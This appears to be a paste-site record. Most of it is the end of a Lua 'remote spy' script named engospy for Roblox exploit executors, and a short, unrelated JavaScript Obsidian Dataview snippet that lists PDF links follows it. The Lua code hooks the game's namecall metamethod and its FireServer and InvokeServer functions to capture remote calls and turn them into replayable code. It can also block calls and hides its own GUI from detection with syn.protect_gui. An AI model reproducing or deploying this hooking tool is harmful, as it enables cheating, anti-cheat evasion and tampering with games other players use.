    elseif _t == 'OverlapParams' then
        return ""--[[typeof: OverlapParams ->]] {FilterDescendantsInstances = ""..spy.get_real_value(value.FilterDescendantsInstances).."", FilterType = ""..spy.get_real_value(value.FilterType).."", MaxParts =""..spy.get_real_value(value.MaxParts).."", CollisionGroup = ""..spy.get_real_value(value.CollisionGroup)..""}""
    elseif _t == 'userdata' then
        return ""newproxy(true)""
    elseif value == nil then
        return ""nil""
    end
    return tostring(value)
end

function spy.convert_to_code(event, args, ncm)
    local path = spy.get_real_value(event)
    if #args == 0 then 
        return path.."":""..ncm..""()""
    elseif #args == 1 then
        return path.."":""..ncm..""(""..spy.get_real_value(args[1]).."")""
    end
    

    local codestr = path.."":""..ncm..""(table.unpack(""
    codestr = codestr..spy.get_real_value(args)
    codestr = codestr..""))""
    return codestr
end

function spy.convert_to_code_client(event, args, ncm)
    table.insert(args, 1, lplr)

    local path = spy.get_real_value(event)
    if #args == 1 then 
        return path.."":""..ncm..""(""..spy.get_real_value(args[1]).."")""
    elseif #args == 2 then
        return path.."":""..ncm..""("".. spy.get_real_value(args[1]) .. "", "" ..spy.get_real_value(args[2]).."")""
    end

    local codestr = path.."":""..ncm..""(table.unpack(""
    codestr = codestr..spy.get_real_value(args)
    codestr = codestr..""))""
    return codestr
end

local function dragGUI(gui, dragpart)
    spawn(function()
        local dragging
        local dragInput
        local dragStart = Vector3.new(0,0,0)
        local startPos
        local function update(input)
            local delta = input.Position - dragStart
            local Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + (delta.X), startPos.Y.Scale, startPos.Y.Offset + (delta.Y))
            service.TweenService:Create(gui, TweenInfo.new(.20), {Position = Position}):Play()
        end
        dragpart.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch and dragging == false then
                dragStart = input.Position
                local delta = (input.Position - dragStart)
                if delta.Y <= 30 then
                    startPos = gui.Position
                    
                    input.Changed:Connect(function()
                        if input.UserInputState == Enum.UserInputState.End then
                            dragging = false
                        end
                    end)
                end
            end
        end)
        dragpart.InputChanged:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
                dragInput = input
            end
        end)
        service.UserInputService.InputChanged:Connect(function(input)
            if input == dragInput and dragging then
                update(input)
            end
        end)
    end)
end

function spy.createUILibrary()
    local api = {}
    local objects = {}
    api.objects = objects
    spy.MainGui = spy:createInstance(""ScreenGui"", {Name = ""engospy ""..tostring(spy.VERSION)})
    function spy.Minimize() 
        local isMinimizing = api.Main.Visible
        for i,v in next, spy.MainGui:GetChildren() do 
            if v == api.Icon then 
                v.Visible = isMinimizing
            elseif v == api.Main then
                v.Visible = not isMinimizing
            else
                v.Visible = false
            end
        end
    end
    spy.guiConnections[#spy.guiConnections+1] = service.UserInputService.InputBegan:Connect(function(input)
        if input.KeyCode == spy.minimizeBind then 
            spy.Minimize()
        end
    end)
    if syn then syn.protect_gui(spy.MainGui) end; spy.MainGui.Parent = (gethui and gethui() or service.CoreGui)
    api.Main = spy:createInstance(""Frame"", {Name = ""Main"", Parent = spy.MainGui, BackgroundColor3 = Color3.fromRGB(38, 38, 38), Position = UDim2.new(0.326838464, 0, 0.313684225, 0), Size = UDim2.new(0, 637, 0, 394), Draggable = true, Active = true})
    api.Topbar = spy:createInstance(""Frame"", {Name = ""Topbar"", Parent = api.Main, BackgroundColor3 = Color3.fromRGB(255, 255, 255), BackgroundTransparency = 1.000, Position = UDim2.new(0.230337083, 0, 0, 0), Size = UDim2.new(0, 411, 0, 46)})
    api.Sidebar = spy:createInstance(""Frame"", {Name = ""Sidebar"", Parent = api.Main, BackgroundColor3 = Color3.fromRGB(24, 24, 24), BorderSizePixel = 0, Size = UDim2.new(0, 124, 1, 0)})
    api.Title = spy:createInstance(""TextLabel"", {Name = ""Title"", Parent = api.Sidebar, AnchorPoint = Vector2.new(0.5, 0), BackgroundColor3 = Color3.fromRGB(255, 255, 255), BackgroundTransparency = 1.000, Position = UDim2.new(0.492128909, 0, 0.00581395347, 5), Size = UDim2.new(0, 84, 0, 30), Font = Enum.Font.GothamBold, Text = ""engospy"", TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 24})
    api.ButtonContainer = spy:createInstance(""Frame"", {Name = ""ButtonContainer"", Parent = api.Sidebar, BackgroundTransparency = 1.000, Position = UDim2.new(0, 0, 0, 45), Size = UDim2.new(0, 124, 1, 0)})
    api.UIListLayout = spy:createInstance(""UIListLayout"", {Name = ""UIListLayout"", Parent = api.ButtonContainer, SortOrder = Enum.SortOrder.LayoutOrder})
    api.Version = spy:createInstance(""TextLabel"", {Name = ""Version"", Parent = api.Sidebar, AnchorPoint = Vector2.new(0.5, 0), BackgroundColor3 = Color3.fromRGB(255, 255, 255), BackgroundTransparency = 1.000, Position = UDim2.new(0.5, 0, 0.99000001, -20), Size = UDim2.new(0, 31, 0, 18), Font = Enum.Font.Gotham, Text = tostring(spy.VERSION),TextColor3 = Color3.fromRGB(190, 190, 190), TextSize = 15.000, TextWrapped = false, TextXAlignment = Enum.TextXAlignment.Center})
    api.UICorner = spy:createInstance(""UICorner"", {Parent = api.Main, CornerRadius = UDim.new(0, 6)})
    api.Close = spy:createInstance(""TextButton"", {Name = ""Close"", Parent = api.Main, BackgroundColor3 = Color3.fromRGB(222, 48, 48), BorderSizePixel = 0, Position = UDim2.new(0.974882185, -18, 0, 0), Size = UDim2.new(0, 26, 0, 7), Text = """"})
    api.UICorner2 = spy:createInstance(""UICorner"", {Parent = api.Close, CornerRadius = UDim.new(0, 6)})
    api.Minimize = spy:createInstance(""TextButton"", {Name = ""Minimize"", Parent = api.Main, BackgroundColor3 = Color3.fromRGB(253, 229, 119), BorderSizePixel = 0, Position = UDim2.new(0.919937134, -18, 0, 0), Size = UDim2.new(0, 26, 0, 7), Text = """"})
    api.UICorner3 = spy:createInstance(""UICorner"", {Parent = api.Minimize, CornerRadius = UDim.new(0, 6)})
    api.Icon = spy:createInstance(""ImageButton"", {Parent = spy.MainGui, BackgroundColor3 = Color3.fromRGB(24, 24, 24), Position = UDim2.new(0.957393527, 0, 0.603157878, 0), Size = UDim2.new(0, 44, 0, 44), Visible = false, AutoButtonColor = false})
    api.IconImage = spy:createInstance(""ImageLabel"", {Name = ""ELogo"", Parent = api.Icon, AnchorPoint = Vector2.new(0.5, 0.5), BackgroundTransparency = 1.000, Position = UDim2.new(0.5, 0, 0.5, 0), Size = UDim2.new(0.699999988, 0, 0.699999988, 0), Image = ""rbxassetid://9710071559""})
    api.UICorner4 = spy:createInstance(""UICorner"", {Parent = api.Icon, CornerRadius = UDim.new(0, 2147483647)})
    
    api.Icon.MouseButton1Click:Connect(spy.Minimize)
    function api.createCallContainer(name) 
        local callapi = {Name = name, FullName = name..""CallContainer"", Type = ""CallContainer"", Calls = {}}
        callapi.Button = spy:createInstance(""TextButton"", {Name = name, Parent = api.ButtonContainer,Size = UDim2.new(0, 124, 0, 25), BackgroundTransparency = 1, BackgroundColor3 = Color3.fromRGB(38, 38, 38), BorderSizePixel = 0, Font = Enum.Font.Gotham, Text = name, TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 14})
        callapi.Background = spy:createInstance(""Frame"", {Name = ""CallContainerBack"", Parent = api.Main,ClipsDescendants = true, BackgroundColor3 = Color3.fromRGB(23, 23, 23), BorderSizePixel = 0, Position = UDim2.new(-0.0152793899, 140, 0.0169999953, 0), Size = UDim2.new(0.784279406, 0, 0.967999995, 0), Visible = false})
        callapi.Container = spy:createInstance(""ScrollingFrame"", {Name = callapi.FullName, Parent = callapi.Background,ClipsDescendants = true, Active = true, AnchorPoint = Vector2.new(0.5, 0.5), BackgroundColor3 = Color3.fromRGB(24, 24, 24), BackgroundTransparency = 1.000, BorderSizePixel = 0, Position = UDim2.new(0.5, 0, 0.5, 0), Size = UDim2.new(0.980000019, 0, 0.963999987, 0), ScrollBarThickness = 0, VerticalScrollBarPosition = Enum.VerticalScrollBarPosition.Left})
        callapi.UIListLayout = spy:createInstance(""UIListLayout"", {Parent = callapi.Container, HorizontalAlignment = Enum.HorizontalAlignment.Center, SortOrder = Enum.SortOrder.LayoutOrder, Padding = UDim.new(0, 3)})
        callapi.UICorner = spy:createInstance(""UICorner"", {Parent = callapi.Background})
        spy.guiConnections[#spy.guiConnections+1] = callapi.UIListLayout:GetPropertyChangedSignal(""AbsoluteContentSize""):Connect(function()
            callapi.Container.CanvasSize = UDim2.new(0,0,0,callapi.UIListLayout.AbsoluteContentSize.Y)
        end)
        function callapi.open()
            for i,v in next, objects do
                if v.Type == ""CallContainer"" and v ~= callapi then 
                    v.Background.Visible = false
                    v.Button.BackgroundTransparency = 1
                elseif v == callapi then
                    v.Background.Visible = true
                    v.Button.BackgroundTransparency = 0
                end
            end
            for i,v in next, objects do 
                for i2,v2 in next, v.Calls do 
                    v2.OptionsContainer.Visible = false
                    for i3,v3 in next, v2.Calls do 
                        if v3.OptionsContainer then
                            v3.OptionsContainer.Visible = false
                        end
                    end
                end
            end
        end
        callapi.Button.MouseButton1Click:Connect(callapi.open)

        function callapi.createCall(remote, code) 
            local callapi2 = {Remote = remote, Calls = {}}
            for _,v in next, callapi.Calls do 
                if v.Remote == remote then
                    v.updateCall(code)
                    return v
                end
            end

            function callapi2.updateCall(newCode) 
                local newCode = newCode:gsub(""\n"", """")
                callapi2.Calls[#callapi2.Calls+1] = {Code = newCode}
                local text = callapi2.CallAmount.Text:gsub(""x"", """")
                callapi2.CallAmount.Text = ""x""..tostring(tonumber(text) + 1)
                if #callapi2.Calls >= spy.maxCallsSaved then
                    return
                end
                callapi2.addNewCall(newCode)
            end

            function callapi2.addNewCall(newCode) 
                local callapi3 = {Code = newCode}
                if spy.saveCalls or spy.saveOnlyLastCall then
                    if spy.saveOnlyLastCall and #callapi2.Calls > 0 then 
                        callapi2.Calls[1].CodeLabel.Text = newCode
                        return
                    end
                    callapi3.Call = spy:createInstance(""TextButton"", {Name = ""RemoteCall"", Parent = callapi2.ChildrenContainer, AutoButtonColor = false,AnchorPoint = Vector2.new(0.5, 0), BackgroundColor3 = Color3.fromRGB(38, 38, 38), Position = UDim2.new(-0.00993345678, 0, -0.0887730792, 0), Size = UDim2.new(0.995000005, 0, 0, 36)})
                    callapi3.UICorner = spy:createInstance(""UICorner"", {CornerRadius = UDim.new(0,6), Parent = callapi3.Call})
                    callapi3.SettingsButton = spy:createInstance(""ImageButton"", {Name = ""SettingsButton"", Parent = callapi3.Call,ClipsDescendants = true, AnchorPoint = Vector2.new(0, 0.5), BackgroundTransparency = 1.000, Position = UDim2.new(0.939999998, 0, 0.5, 0), Size = UDim2.new(0, 26, 0, 26), Image = ""rbxassetid://2717396089"", ImageColor3 = Color3.fromRGB(122, 122, 122), ScaleType = Enum.ScaleType.Fit})
                    callapi3.OptionsContainer = spy:createInstance(""Frame"", {Name = ""OptionsContainer"", Parent = spy.MainGui,ZIndex = 10, BackgroundColor3 = Color3.fromRGB(23, 23, 23), BorderSizePixel = 1, BorderColor3 = Color3.fromRGB(38,38,38), Position = UDim2.fromOffset(7,15), Size = UDim2.new(0, 113, 0, 30), Visible = false})
                    callapi3.OptionsButtonContainer = spy:createInstance(""Frame"", {Name = ""OptionsButtonContainer"", Parent = callapi3.OptionsContainer,ZIndex = 10, AnchorPoint = Vector2.new(0.5, 0.5), BackgroundTransparency = 1.000, Position = UDim2.new(0.5, 0, 0.5, 0), Size = UDim2.new(0.959999979, 0, 0.952903688, 0)})
                    callapi3.OptionsUIListLayout = spy:createInstance(""UIListLayout"", {Parent = callapi3.OptionsButtonContainer, SortOrder = Enum.SortOrder.LayoutOrder, VerticalAlignment = Enum.VerticalAlignment.Center})
                    callapi3.CopyButton = spy:createInstance(""TextButton"", {Name = ""CopyLast"", Parent = callapi3.OptionsButtonContainer,ZIndex = 10, BackgroundColor3 = Color3.fromRGB(23, 23, 23), BorderSizePixel = 0, Position = UDim2.new(0.0967741907, 0, 0, 0), Size = UDim2.new(1, 0, 0, 25), Font = Enum.Font.Gotham, Text = ""Copy code"", TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 14, TextWrapped = true})
                    callapi3.CallNum = spy:createInstance(""TextLabel"", {Name = ""CallNum"", Parent = callapi3.Call, AnchorPoint = Vector2.new(0, 0.5), BackgroundTransparency = 1.000, Position = UDim2.new(0, 12, 0.50000006, 0), Size = UDim2.new(0, 37, 0, 24), Font = Enum.Font.Gotham, Text = ""#1"", TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 14.000, TextWrapped = true, TextXAlignment = Enum.TextXAlignment.Left})
                    callapi3.CodeContainer = spy:createInstance(""ScrollingFrame"", {Name = ""CodeContainer"", Parent = callapi3.Call,ScrollBarImageTransparency=0.75, ScrollingDirection = Enum.ScrollingDirection.XY, Active = true, AnchorPoint = Vector2.new(0, 0.5), BackgroundColor3 = Color3.fromRGB(23, 23, 23), BorderSizePixel = 0, Position = UDim2.new(0.079, 0, 0.5, 0), Size = UDim2.new(0, 416, 0, 26), HorizontalScrollBarInset = Enum.ScrollBarInset.Always, ScrollBarThickness = 2.5, VerticalScrollBarInset = Enum.ScrollBarInset.Always})
                    callapi3.CodeLabel = spy:createInstance(""TextLabel"", {Name = ""CodeLabel"", Parent = callapi3.CodeContainer,AutomaticSize = Enum.AutomaticSize.XY, BackgroundTransparency = 1.000, Position = UDim2.new(0, 10, 0, 0), Size = UDim2.new(0, 771, 0, 25), Font = Enum.Font.Gotham, Text = newCode:gsub(""\n"",""""), TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 12.000, TextXAlignment = Enum.TextXAlignment.Left})
                    --callapi3.CallNum.Text = ""#""..tostring(#callapi2.Calls+1)
                    callapi3.CodeContainer.CanvasSize = UDim2.new(0,callapi3.CodeLabel.AbsoluteSize.X+18,0,0)
                    spy.guiConnections[#spy.guiConnections+1] = callapi3.CodeLabel:GetPropertyChangedSignal(""AbsoluteSize""):Connect(function() 
                        callapi3.CodeContainer.CanvasSize = UDim2.new(0,callapi3.CodeLabel.AbsoluteSize.X+18,0,0)
                    end)

                    --spy.guiConnections[#spy.guiConnections+1] = callapi3.CodeContainer.MouseEnter:Connect(function() 
                    --    callapi.Container.ScrollingEnabled = false
                    --end)

                    --spy.guiConnections[#spy.guiConnections+1] = callapi3.CodeContainer.MouseLeave:Connect(function() 
                    --    callapi.Container.ScrollingEnabled = true
                    --end)

                    function callapi3.openSettings() 
                        for i,v in next, objects do 
                            for i2,v2 in next, v.Calls do 
                                if v2.OptionsContainer ~= callapi3.OptionsContainer then
                                    v2.OptionsContainer.Visible = false
                                end
                                for i3,v3 in next, v2.Calls do 
                                    if v3.OptionsContainer and (v3.OptionsContainer ~= callapi3.OptionsContainer) then
                                        v3.OptionsContainer.Visible = false
                                    end
                                end
                            end
                        end
                        if not callapi3.OptionsContainer.Visible then
                            callapi3.OptionsContainer.Position = UDim2.fromOffset(mouse.X, mouse.Y)
                        end
                        callapi3.OptionsContainer.Visible = not callapi3.OptionsContainer.Visible
                    end

                    function callapi3.copy() 
                        callapi3.OptionsContainer.Visible = false
                        setclipboardfunc(newCode)
                    end

                    callapi3.CopyButton.MouseButton1Click:Connect(callapi3.copy)
                    callapi3.Call.MouseButton2Click:Connect(callapi3.openSettings)
                    callapi3.SettingsButton.MouseButton1Click:Connect(callapi3.openSettings)
                end
                callapi2.Calls[#callapi2.Calls + 1] = callapi3
                return callapi3
            end

            callapi2.Call = spy:createInstance(""TextButton"", {Name = ""RemoteCall"", Text="""",ClipsDescendants = false, AutoButtonColor=false, Parent = callapi.Container, AnchorPoint = Vector2.new(0.5, 0), BackgroundColor3 = Color3.fromRGB(38,38,38), Position = UDim2.new(0.000436, 0,0,0), Size = UDim2.new(0.995000005, 0, 0, 36)})
            callapi2.UICorner = spy:createInstance(""UICorner"", {Parent = callapi2.Call, CornerRadius = UDim.new(0,6)})
            callapi2.Icon = spy:createInstance(""ImageLabel"", {Name = ""Icon"", Parent = callapi2.Call, AnchorPoint = Vector2.new(0, 0.5), BackgroundTransparency = 1.000, Position = UDim2.new(0, 4, 0.5, 0), Size = UDim2.new(0, 23, 0, 22), Image = spy.assets[remote.ClassName]})
            callapi2.Name = spy:createInstance(""TextLabel"", {Name = ""Name"", Parent = callapi2.Call, AnchorPoint = Vector2.new(0, 0.5), BackgroundTransparency = 1.000, Position = UDim2.new(0.0737449452, 0, 0.500000238, 0), Size = UDim2.new(0, 328, 0, 24), Font = Enum.Font.Gotham, Text = remote.Name, TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 14, TextWrapped = true, TextXAlignment = Enum.TextXAlignment.Left})
            callapi2.SettingsButton = spy:createInstance(""ImageButton"", {Name = ""SettingsButton"", Parent = callapi2.Call,ClipsDescendants = true, AnchorPoint = Vector2.new(0, 0.5), BackgroundTransparency = 1.000, Position = UDim2.new(0.939999998, 0, 0.5, 0), Size = UDim2.new(0, 26, 0, 26), Image = ""rbxassetid://2717396089"", ImageColor3 = Color3.fromRGB(122, 122, 122), ScaleType = Enum.ScaleType.Fit})
            callapi2.CallAmount = spy:createInstance(""TextLabel"", {Name = ""CallAmount"", Parent = callapi2.Call, AnchorPoint = Vector2.new(0, 0.5), BackgroundTransparency = 1.000, Position = UDim2.new(0.768197536, 0, 0.500000238, 0), Size = UDim2.new(0, 78, 0, 24), Font = Enum.Font.Gotham, Text = ""x1"", TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 14, TextWrapped = true, TextXAlignment = Enum.TextXAlignment.Right})
            callapi2.OptionsContainer = spy:createInstance(""Frame"", {Name = ""OptionsContainer"", Parent = spy.MainGui,ZIndex = 10, BackgroundColor3 = Color3.fromRGB(23, 23, 23), BorderSizePixel = 1, BorderColor3 = Color3.fromRGB(38,38,38), Position = UDim2.fromOffset(7,15), Size = UDim2.new(0, 113, 0, 111), Visible = false})
            callapi2.OptionsButtonContainer = spy:createInstance(""Frame"", {Name = ""OptionsButtonContainer"", Parent = callapi2.OptionsContainer,ZIndex = 10, AnchorPoint = Vector2.new(0.5, 0.5), BackgroundTransparency = 1.000, Position = UDim2.new(0.5, 0, 0.5, 0), Size = UDim2.new(0.959999979, 0, 0, 0)})
            callapi2.OptionsUIListLayout = spy:createInstance(""UIListLayout"", {Parent = callapi2.OptionsButtonContainer, SortOrder = Enum.SortOrder.LayoutOrder, VerticalAlignment = Enum.VerticalAlignment.Center})
            callapi2.CopyButton = spy:createInstance(""TextButton"", {Name = ""CopyLast"", Parent = callapi2.OptionsButtonContainer,ZIndex = 10, BackgroundColor3 = Color3.fromRGB(23, 23, 23), BorderSizePixel = 0, Position = UDim2.new(0.0967741907, 0, 0, 0), Size = UDim2.new(1, 0, 0, 25), Font = Enum.Font.Gotham, Text = ""Copy last call"", TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 14, TextWrapped = true})
            callapi2.Copy10Button = spy:createInstance(""TextButton"", {Name = ""Copy10"", Parent = callapi2.OptionsButtonContainer,ZIndex = 10, BackgroundColor3 = Color3.fromRGB(23, 23, 23), BorderSizePixel = 0, Position = UDim2.new(0.0967741907, 0, 0, 0), Size = UDim2.new(1, 0, 0, 25), Font = Enum.Font.Gotham, Text = ""Copy last x10"", TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 14, TextWrapped = true})
            callapi2.CopyAllButton = spy:createInstance(""TextButton"", {Name = ""Copy10"", Parent = callapi2.OptionsButtonContainer,ZIndex = 10, BackgroundColor3 = Color3.fromRGB(23, 23, 23), BorderSizePixel = 0, Position = UDim2.new(0.0967741907, 0, 0, 0), Size = UDim2.new(1, 0, 0, 25), Font = Enum.Font.Gotham, Text = ""Copy all"", TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 14, TextWrapped = true})
            callapi2.IgnoreButton = spy:createInstance(""TextButton"", {Name = ""Ignore"", Parent = callapi2.OptionsButtonContainer,ZIndex = 10, BackgroundColor3 = Color3.fromRGB(23, 23, 23), BorderSizePixel = 0, Position = UDim2.new(0.0967741907, 0, 0, 0), Size = UDim2.new(1, 0, 0, 25), Font = Enum.Font.Gotham, Text = ""Ignore"", TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 14, TextWrapped = true})
            callapi2.BlockButton = spy:createInstance(""TextButton"", {Name = ""Block"", Parent = callapi2.OptionsButtonContainer,ZIndex = 10, BackgroundColor3 = Color3.fromRGB(23, 23, 23), BorderSizePixel = 0, Position = UDim2.new(0.0967741907, 0, 0, 0), Size = UDim2.new(1, 0, 0, 25), Font = Enum.Font.Gotham, Text = ""Block"", TextColor3 = Color3.fromRGB(255, 255, 255), TextSize = 14, TextWrapped = true})
            callapi2.UICorner2 = spy:createInstance(""UICorner"", {Parent = callapi2.OptionsButtonContainer})
            callapi2.ChildrenContainer = spy:createInstance(""Frame"", {Name = ""CallChildren"", Parent = callapi.Container,AutomaticSize = Enum.AutomaticSize.Y, Visible=false, AnchorPoint = Vector2.new(0.5, 0), BackgroundColor3 = Color3.fromRGB(38, 38, 38), BackgroundTransparency = 1.000,Position = UDim2.new(0.00436409656, 0, 0, 0),Size = UDim2.new(1, 0, -0.00600000005, 36)})
            callapi2.ChildrenUIListLayout = spy:createInstance(""UIListLayout"", {Parent = callapi2.ChildrenContainer, HorizontalAlignment = Enum.HorizontalAlignment.Center, SortOrder = Enum.SortOrder.LayoutOrder, Padding = UDim.new(0, 3)})

            callapi2.OptionsButtonContainer.Size = UDim2.new(0.959999979, 0, 0, callapi2.OptionsUIListLayout.AbsoluteContentSize.Y)

            callapi2.addNewCall(code)

            function callapi2.openSettings() 
                for i,v in next, objects do 
                    for i2,v2 in next, v.Calls do 
                        if v2.OptionsContainer ~= callapi2.OptionsContainer and v2.OptionsContainer then
                            v2.OptionsContainer.Visible = false
                        end
                        for i3,v3 in next, v2.Calls do 
                            if v3.OptionsContainer ~= callapi2.OptionsContainer and v3.OptionsContainer then
                                v3.OptionsContainer.Visible = false
                            end
                        end
                    end
                end
                if not callapi2.OptionsContainer.Visible then
                    callapi2.OptionsContainer.Position = UDim2.new(0,mouse.X, 0,mouse.Y)
                end
                callapi2.OptionsContainer.Visible = not callapi2.OptionsContainer.Visible
            end

            function callapi2.copyLast() 
                callapi2.OptionsContainer.Visible = false
                if setclipboardfunc then 
                    if callapi2.Calls[#callapi2.Calls] ~= nil then
                        setclipboardfunc(callapi2.Calls[#callapi2.Calls].Code)
                    end
                end
            end

            function callapi2.copyLast10()
                callapi2.OptionsContainer.Visible = false 
                if setclipboardfunc then 
                    local str = """"
                    for i,v in next, callapi2.Calls do 
                        if i >= #callapi2.Calls-10 then 
                            str= str..""\n--Call #""..tostring(i).."":\n""..v.Code..""\n""
                        end
                    end
                    setclipboardfunc(str)
                end
            end

            function callapi2.copyAll() 
                callapi2.OptionsContainer.Visible = false 
                if setclipboardfunc then 
                    local str = """"
                    for i,v in next, callapi2.Calls do 
                        str= str..""\n--Call #""..tostring(i).."":\n""..v.Code..""\n""
                    end
                    setclipboardfunc(str)
                end
            end

            function callapi2.Block() 
                callapi2.OptionsContainer.Visible = false
                if table.find(spy.blocked, remote) then
                    table.remove(spy.blocked, table.find(spy.blocked, remote))
                    callapi2.BlockButton.Text = ""Block""
                    return
                end
                callapi2.BlockButton.Text = ""Unblock""
                table.insert(spy.blocked, remote)
            end

            function callapi2.Ignore() 
                callapi2.OptionsContainer.Visible = false
                if table.find(spy.ignored, remote) then
                    table.remove(spy.ignored, table.find(spy.ignored, remote))
                    callapi2.IgnoreButton.Text = ""Ignore""
                    return
                end
                callapi2.IgnoreButton.Text = ""Unignore""
                table.insert(spy.ignored, remote)
            end

            function callapi2.Expand() 
                if not spy.saveCalls and not spy.saveOnlyLastCall then return end
                if callapi2.ChildrenContainer.Visible then 
                    for i,v in next, callapi2.Calls do 
                        if v.OptionsContainer and v.OptionsContainer.Visible then 
                            v.OptionsContainer.Visible = false
                        end
                    end
                end
                callapi2.ChildrenContainer.Visible = not callapi2.ChildrenContainer.Visible
            end

            callapi2.Call.MouseButton2Click:Connect(callapi2.openSettings)
            callapi2.SettingsButton.MouseButton1Click:Connect(callapi2.openSettings)
            callapi2.CopyButton.MouseButton1Click:Connect(callapi2.copyLast)
            callapi2.Copy10Button.MouseButton1Click:Connect(callapi2.copyLast10)
            callapi2.CopyAllButton.MouseButton1Click:Connect(callapi2.copyAll)
            callapi2.BlockButton.MouseButton1Click:Connect(callapi2.Block)
            callapi2.IgnoreButton.MouseButton1Click:Connect(callapi2.Ignore)
            callapi2.Call.MouseButton1Click:Connect(callapi2.Expand)

            callapi.Calls[remote.Name] = callapi2
            return callapi2
        end
        objects[name..""CallContainer""] = callapi
        return callapi
    end

    api.Close.MouseButton1Click:Connect(spy.Destroy)
    api.Minimize.MouseButton1Click:Connect(spy.Minimize)
    return api
end
spy.UILibrary = spy:createUILibrary()
local tabs = {}
for i,v in next, spy.namecallmethods do 
    tabs[i] = spy.UILibrary.createCallContainer(v)
end
tabs.RemoteEventClient = spy.UILibrary.createCallContainer(""FireClient"")
if isV3 then
    tabs.RemoteFunctionClient = spy.UILibrary.createCallContainer(""InvokeClient"")
end

if not wasLoaded then spy.Minimize() end

function spy.onEventFired(event, args, ncm) 
    local codestr = spy.convert_to_code(event, args, ncm)
    tabs[event.ClassName].createCall(event, codestr)
end

function spy.onClientEventFired(event, args, ncm)
    local codestr = spy.convert_to_code_client(event, args, ncm)
    tabs.RemoteEventClient.createCall(event, codestr)
end

function spy.hook()
    is_hooking = true
    old_namecall = hookmetamethod(game, ""__namecall"", newcclosure(function(self, ...)
        local args = {...}
        local ncm = getnamecallmethod()
        local callingscript = getcallingscript()
        if is_hooking == true and (string.lower(ncm) == ""invokeserver"" or string.lower(ncm) == ""fireserver"") and (string.find(self.ClassName, ""Event"") or string.find(self.ClassName, ""Function"")) and self~=spy.event and not table.find(spy.ignored, self) and (not table.find(spy.blacklistedNames, self.Name)) then 
            if not checkcaller() and table.find(spy.blocked, self) then return end
            spy.event.Fire(spy.event, self, args, ncm, false)
        end
        return old_namecall(self, ...)
    end));

    local OldFireServer
    OldFireServer = hookfunction(Instance.new(""RemoteEvent"").FireServer,function(self, ...) 
        local args = {...}
        if is_hooking and not table.find(spy.ignored, self) then
           if not checkcaller() and table.find(spy.blocked, self) then return end
           spy.event.Fire(spy.event, self, args, ""FireServer"", false)
        end
        return OldFireServer(self, ...)
    end)

    local OldInvokeServer
    OldInvokeServer = hookfunction(Instance.new(""RemoteFunction"").InvokeServer,function(self, ...) 
        local args = {...}
        if is_hooking and not table.find(spy.ignored, self) then
           if not checkcaller() and table.find(spy.blocked, self) then return end
           spy.event.Fire(spy.event, self, args, ""InvokeServer"", false)
        end
        return OldInvokeServer(self, ...)
    end)

    for i,v in next, game:GetDescendants() do 
        local ClassName = v.ClassName
        if ClassName == ""RemoteEvent"" then
            spy.Connections[#spy.Connections+1] = v.OnClientEvent:Connect(function(...)
                spy.event:Fire(v, {...}, ""FireClient"", true)
            end)
        end
	if isV3 and ClassName == ""RemoteFunction"" and false then 
            local func = getcallbackmember(v, ""OnClientInvoke"")
	
            local old;
            old = hookfunction(func, newcclosure(function(...)
                if is_hooking then
                    spy.event:Fire(v, {...}, ""InvokeClient"", true)
                end
                return old(...)
            end))
            v:GetPropertyChangedSignal(""OnClientInvoke""):Connect(function()
                local func = getcallbackmember(v, ""OnClientInvoke"")
                local old;
                old = hookfunction(func, newcclosure(function(...)
                    if is_hooking then
                        spy.event:Fire(v, {...}, ""InvokeClient"", true)
                    end
                    return old(...)
                end))
            end)
        end
    end

    spy.Connections[#spy.Connections+1]= game.DescendantAdded:Connect(function(v) 
        local ClassName = v.ClassName
        if ClassName == ""RemoteEvent"" then
            spy.Connections[#spy.Connections+1] = v.OnClientEvent:Connect(function(...)
                spy.event:Fire(v, {...}, ""FireClient"", true)
            end)
        end
        if isV3 and ClassName == ""RemoteFunction"" then 
            local func = getcallbackmember(v, ""OnClientInvoke"")
            local old;
            old = hookfunction(func, newcclosure(function(...)
                if is_hooking then
                    spy.event:Fire(v, {...}, ""InvokeClient"", true)
                end
                return old(...)
            end))
            v:GetPropertyChangedSignal(""OnClientInvoke""):Connect(function()
                local func = getcallbackmember(v, ""OnClientInvoke"")
                local old;
                old = hookfunction(func, newcclosure(function(...)
                    if is_hooking then
                        spy.event:Fire(v, {...}, ""InvokeClient"", true)
                    end
                    return old(...)
                end))
            end)
        end
    end)

    spy.event.Event:Connect(function(event, args, ncm, isClient) 
        if isClient then 
            spy.onClientEventFired(event, args, ncm)
            return
        end
        spy.onEventFired(event, args, ncm)
    end)
end

function spy.unhook()
    is_hooking = false
    for i,v in next, spy.Connections do 
        v:Disconnect()
        spy.Connections[i] = nil
    end
end

spy.hook()"
Namf49dE,Untitled,dhniceday,JavaScript,Monday 6th of May 2024 12:56:40 PM CDT,"let pg = dv.current()
let studytopic = pg.studytopic.replace(/[%]+/g,'');
const allPdf = app.vault.getFiles().filter(file => file.extension == 'pdf' && file.path.includes(studytopic));
let myList = allPdf.map(file => dv.fileLink(file.path));
for (let line of myList) {
	dv.paragraph('- [b] ' + line);
}"
